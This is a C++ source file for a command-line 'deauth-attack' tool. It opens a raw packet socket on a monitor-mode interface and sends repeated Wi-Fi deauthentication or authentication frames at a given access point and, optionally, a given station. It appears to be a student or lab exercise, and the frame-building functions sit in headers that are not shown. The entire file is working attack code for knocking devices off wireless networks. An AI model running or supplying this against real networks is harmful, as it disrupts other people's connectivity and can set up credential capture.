#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <vector>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <net/ethernet.h> // ETH_P_ALL
#include <arpa/inet.h>

#include "deauth.h"
#include "auth.h"

bool parseMac(const char* macStr, uint8_t* macArr) {
    int values[6];
    if (6 == sscanf(macStr, "%x:%x:%x:%x:%x:%x",
                    &values[0], &values[1], &values[2],
                    &values[3], &values[4], &values[5])) {
        for (int i = 0; i < 6; i++)
            macArr[i] = (uint8_t)values[i];
        return true;
    }
    return false;
}

int main(int argc, char* argv[]) {

    if (argc < 3) {
        std::cerr << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n"
                  << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
        return -1;
    }
    
    const char* dev = argv[1];
    uint8_t apMac[6];
    if (!parseMac(argv[2], apMac)) {
        std::cerr << "[-] AP MAC parsing error\n";
        return -1;
    }

    bool hasStation = false;
    bool isAuth = false;
    uint8_t stationMac[6] = {0,};

    if (argc >= 4) {     
        if (strcmp(argv[3], "-auth") == 0) {
            isAuth = true;
        } else {
            hasStation = true;
            if (!parseMac(argv[3], stationMac)) {
                std::cerr << "[-] Station MAC parsing error\n";
                return -1;
            }
            
            if (argc == 5 && strcmp(argv[4], "-auth") == 0) {
                isAuth = true;
            }
        }
    }

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        std::cerr << "[-] Failed to open raw socket\n";
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        std::cerr << "[-] Failed to get interface index\n";
        close(sock);
        return -1;
    }

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = ifr.ifr_ifindex;
    addr.sll_protocol = htons(ETH_P_ALL);

    if (bind(sock, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) < 0) {
        std::cerr << "[-] Failed to bind socket\n";
        close(sock);
        return -1;
    }

    std::cout << "[+] Interface: " << dev << " bound successfully.\n";

    if (isAuth) {
        std::cout << "[+] Authentication attack mode\n";
        for (int i = 0; i < 5; i++) {
            sendAuthFrame(sock, apMac, hasStation ? stationMac : nullptr);
            std::cout << "[+] Sent Auth frame #" << (i + 1) << "\n";
            sleep(1);
        }
    } else {
        std::cout << "[+] Deauthentication attack mode\n";
        for (int i = 0; i < 5; i++) {
            sendDeauthFrame(sock, apMac, hasStation ? stationMac : nullptr);
            std::cout << "[+] Sent Deauth frame #" << (i + 1) << "\n";
            sleep(1);
        }
    }

    close(sock);
    return 0;
}
